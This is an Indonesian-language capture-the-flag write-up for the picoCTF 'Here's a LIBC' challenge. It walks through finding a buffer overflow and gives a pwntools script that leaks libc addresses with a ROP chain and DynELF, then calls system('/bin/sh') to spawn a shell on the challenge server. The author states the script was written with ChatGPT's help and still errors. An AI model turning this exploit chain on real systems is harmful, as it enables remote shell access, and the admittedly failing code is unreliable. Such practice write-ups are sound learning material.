# Write Up Here a Libc

Step pertama yang saya coba adalah dengan menjalankan program dengan connect ke remote server yang disediakan. 

<div align="center">
  <img src="https://github.com/user-attachments/assets/14bdca32-f80e-4890-bba7-7003b082a89b">
</div>
</br>

Dari foto di atas, saya mengetahui bahwa program ini merubah input text yang dimasukkan oleh user menjadi uppercase di huruf yang ganjil dan lowercase di huruf yang genap.

Lalu, saya mencoba untuk membuka program dengan Ghidra. Pada fungsi **main**, saya mengetahui bahwa dia memanggil fungsi **do_stuff()** yang disimpan dalam do while.

<div align="center">
  <img src="https://github.com/user-attachments/assets/95b39820-4de7-47ac-b831-de0a515656be">
</div>
</br>

Berikut adalah fungsi **do_stuff()**:

<div align="center">
  <img src="https://github.com/user-attachments/assets/b38a0f05-93f1-4229-a819-50d661c9cafd">
</div>
</br>

Berdasarkan decompiled code fungsi **do_stuff()**, ada kemungkinan buffer overflow pada fungsi scanf pertama yang ini adalah input dari user dengan buffer 112 dari local_88. Lalu, pada for loop, huruf yang di convert_case hanya sampai < 100.

Saat saya mencoba input string random untuk mencoba buffer overflow, terjadi segmentation fault.

<div align="center">
  <img src="Screenshot 2024-11-28 021056](https://github.com/user-attachments/assets/c01e2b64-54ad-4c78-b61f-fb9b7ab44a79">
</div>
</br>

Selanjutnya saya mencoba untuk menjalankan di gdb dengan cara yang sama dengan foto di atas. Awalnya saya bingung karena sudah lebih banyak dari buffer (112) tapi nilai di rip belum berubah.

<div align="center">
  <img src="https://github.com/user-attachments/assets/e50750d4-2653-4911-b511-e9df98805054">
</div>
</br>

Karena saya skill issue dan bingung kenapa saat saya menggunakan **gdb gef** tidak berubah juga rip nya (mungkin payload nya salah atau kurang panjang) dan tidak menemukan offset, saya mencari write up di Youtube dan meminta bantuan ChatGPT. Berdasarkan GPT dan video di Youtube, saya akhirnya menggunakan **pwntools cyclic** untuk menemukan offset dari buffer overflow yang ingin dilakukan. Berikut code nya:

```python
from pwn import *

binary = './vuln'
elf = ELF(binary)
context.binary = binary

p = process(binary)

payload = cyclic(200)
p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!', payload)

p.wait()
core = p.corefile

offset = cyclic_find(core.read(core.rsp, 4))
log.info(f"Offset found: {offset}")
```

Saya menjalankan scriptnya di kali linux karena di windows ternyata error dan harus di linux. Ini offsetnya:

<div align="center">
  <img src="https://github.com/user-attachments/assets/03b0e75b-3745-46fc-b81d-87cd27fa54e3">
</div>
</br>

Note 1: Saya ingin jujur ko, di step yang akan dijelaskan selanjutnya, saya mengikuti bantuan ChatGPT terutama dalam pembuatan script.

Note 2: Script yang saya buat dengan bantuan GPT, saat dijalankan selalu mengalami error. Tetapi, di bawah akan saya jelaskan ide dari script yang saya buat. Maaf, ko.

Selanjutnya, setelah mengetahui offset, saya mencari address dari fungsi-fungsi yang ada di libc. Tujuan akhir alamat yang ingin diambil adalah alamat fungsi **system**. Selain fungsi, string **/bin/sh** juga saya cari untuk menjalankan shell di remote server.

Selanjutnya, saya dengan bantuan ChatGPT membuat script untuk eksploitasinya. Pertama, saya membuat fungsi `leak` yang berfungsi untuk nge-leak address dari fungsi yang ada di libc dengan ROP. Fungsi ini akan mengembalikan alamat yang di-leak.

```python
def leak(address):

    log.info(f"Leaking data from address: {hex(address)}")
    
    rop = ROP(elf)
    rop.call(elf.plt['puts'], [address])  # Memanggil puts(address)
    rop.call(main_addr)  # Kembali ke main setelah memanggil puts

    payload = flat({offset: rop.chain()})
    p.sendlineafter("WeLcOmE To mY EcHo sErVeR!", payload) 
    p.recvline()
    leaked_data = p.recvline().strip()
    
    log.info(f"Leaked data: {leaked_data}")
    return leaked_data.ljust(8, b'\x00')  
```

Secara garis besar, fungsi di atas bekerja dengan membuat ROP chain dengan berisi fungsi `puts` pada plt dan address `main` lalu payload dikirim dan server akan mengembalikan address `puts` dari libc.

Selanjutnya, saya membuat fungsi `dynelf_exploit` untuk mendapatkan alamat fungsi `system` dan string `/bin/bash`.

```python
def dynelf_exploit():

    log.info("Starting DynELF...")
    dynelf = DynELF(leak, elf=elf)  # Inisialisasi DynELF dengan fungsi leak
    system_addr = dynelf.lookup('system', 'libc')  # Cari alamat fungsi system
    bin_sh_addr = next(dynelf.iter_strings('/bin/sh'))  # Cari string '/bin/sh'
    log.success(f"system: {hex(system_addr)}, /bin/sh: {hex(bin_sh_addr)}")
    return system_addr, bin_sh_addr
```

Fungsi di atas akan menggunakan DynELF untuk memanggil fungsi leak dengan binary ELF dari binary yang didapat dari soal. Setelah mendapatkan address dari fungsi `leak`, dicari address dari `system` dan `/bin/sh`. Lalu, fungsi ini akan me-return kedua address tersebut.

Pada fungsi `exploit` ini, saya mulai eksploitasi. 

```python
def exploit():

    system_addr, bin_sh_addr = dynelf_exploit()

    log.info("Sending final payload to spawn shell...")
    rop = ROP(elf)
    rop.call(system_addr, [bin_sh_addr])  # Memanggil system("/bin/sh")
    final_payload = flat({offset: rop.chain()})
    p.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n", final_payload)

    # Berikan shell interaktif
    p.interactive()
```
Fungsi ini akan pertama-tama mencari address dari `system` dan `/bin/sh` menggunakan fungsi `dynelf_exploit` di atas. Selanjutnya menggunakan ROP yang berisikan `system("/bin/sh")` sebagai payload yang akan dikirimkan dan mendapatkan shell.

Tetapi, dari code ini, masih terjadi error yang saya juga bingung solve nya bagaimana. Berikut errornya:

<div align="center">
  <img src="https://github.com/user-attachments/assets/71c5da90-7308-41b4-8fc2-77edc1309386">
</div>
</br>

Error ini terjadi ketika script sudah mendapatkan beberapa address, lalu terjadi error ini. Mohon maaf ko, saya sudah berusaha. Jika saya ada ide untuk solve ini, saya akan edit write up ini.

### FULL SCRIPT CODE

```python
from pwn import *

binary = './vuln'  # Nama binary
elf = ELF(binary)
context.binary = elf

# Alamat GOT dari puts dan fungsi main
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

# Offset buffer overflow
offset = 136

# Remote target
p = remote('mercury.picoctf.net', 49464)

def leak(address):

    log.info(f"Leaking data from address: {hex(address)}")
    
    rop = ROP(elf)
    rop.call(elf.plt['puts'], [address])  # Memanggil puts(address)
    rop.call(main_addr)  # Kembali ke main setelah memanggil puts

    payload = flat({offset: rop.chain()})
    p.sendlineafter("WeLcOmE To mY EcHo sErVeR!", payload) 
    p.recvline()
    leaked_data = p.recvline().strip()
    
    log.info(f"Leaked data: {leaked_data}")
    return leaked_data.ljust(8, b'\x00')  

def dynelf_exploit():

    log.info("Starting DynELF...")
    dynelf = DynELF(leak, elf=elf)  # Inisialisasi DynELF dengan fungsi leak
    system_addr = dynelf.lookup('system', 'libc')  # Cari alamat fungsi system
    bin_sh_addr = next(dynelf.iter_strings('/bin/sh'))  # Cari string '/bin/sh'
    log.success(f"system: {hex(system_addr)}, /bin/sh: {hex(bin_sh_addr)}")
    return system_addr, bin_sh_addr

def exploit():
   
    # Mulai eksploitasi dengan DynELF
    system_addr, bin_sh_addr = dynelf_exploit()

    # Payload akhir untuk memanggil system("/bin/sh")
    log.info("Sending final payload to spawn shell...")
    rop = ROP(elf)
    rop.call(system_addr, [bin_sh_addr])  # Memanggil system("/bin/sh")
    final_payload = flat({offset: rop.chain()})
    p.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n", final_payload)

    # Berikan shell interaktif
    p.interactive()

if __name__ == "__main__":
    exploit()

```








